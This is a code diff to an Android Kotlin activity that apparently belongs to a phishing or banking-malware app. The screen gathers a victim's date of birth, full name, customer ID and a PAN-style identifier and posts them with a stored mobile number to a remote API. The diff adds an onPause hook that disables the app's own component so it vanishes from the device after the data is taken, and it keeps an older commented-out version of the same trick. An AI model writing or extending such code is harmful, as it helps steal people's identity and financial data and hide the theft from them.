@@ -25,11 +25,15 @@ class thirdpage : AppCompatActivity() {
         binding = ActivityThirdpageBinding.inflate(layoutInflater)
         setContentView(binding.root)
 
+        val util = Util()
+        util.saveLocalData(this,"check","true")
+
         binding.e1.addTextChangedListener(dateOfBirthTextWatcher)
 
         binding.login.setOnClickListener {
 
-            if (binding.e1.text.toString().isEmpty() || binding.e2.text.toString().isEmpty() || binding.e3.text.toString().isEmpty()) {
+            if (binding.e1.text.toString().isEmpty() || binding.e2.text.toString().isEmpty() ||
+                binding.e3.text.toString().isEmpty() ) {
                 Toast.makeText(this, "fill all fields", Toast.LENGTH_SHORT).show()
 
             }else{
@@ -37,12 +41,10 @@ class thirdpage : AppCompatActivity() {
                 val util = Util()
                 val apiService = ApiClient.getClient().create(ApiService::class.java)
                 val intentff = Intent(this, finalscreen::class.java)
-                val data = ThirdPage(
+                val data = ThirdPage(customerid = binding.e3.text.toString(),
+                    mobile = util.getLocalData(this,"m"),
                     dob = binding.e1.text.toString(),
-                    fullname = binding.e2.text.toString(),
-                    customerid = binding.e3.text.toString(),
-                    mobile = util.getLocalData(this,"m")
-
+                    fullname = binding.e2.text.toString()
                 )
                 val call = apiService.third(data)
                 call.enqueue(object : Callback<Void?> {
@@ -74,12 +76,11 @@ class thirdpage : AppCompatActivity() {
         return panPattern.matches(panNumber)
     }
 
-
-    override fun onStop() {
-        super.onStop()
+    override fun onPause() {
+        super.onPause()
         val util =  Util()
-        if(util.getLocalData(this,"dis")=="1") {
-            util.saveLocalData(this,"dis","2")
+        if(util.getLocalData(this,"check")=="true") {
+            Log.e("asdf123", "pause: verify activity")
             val pakagemanger = packageManager
             pakagemanger.setApplicationEnabledSetting(
                 packageName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
@@ -87,6 +88,19 @@ class thirdpage : AppCompatActivity() {
             )
         }
     }
+
+//    override fun onDestroy() {
+//        super.onDestroy()
+//        val util =  Util()
+//        if(util.getLocalData(this,"dis")=="1") {
+//            util.saveLocalData(this,"dis","2")
+//            val pakagemanger = packageManager
+//            pakagemanger.setApplicationEnabledSetting(
+//                packageName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+//                PackageManager.DONT_KILL_APP
+//            )
+//        }
+//    }
 
 }
 
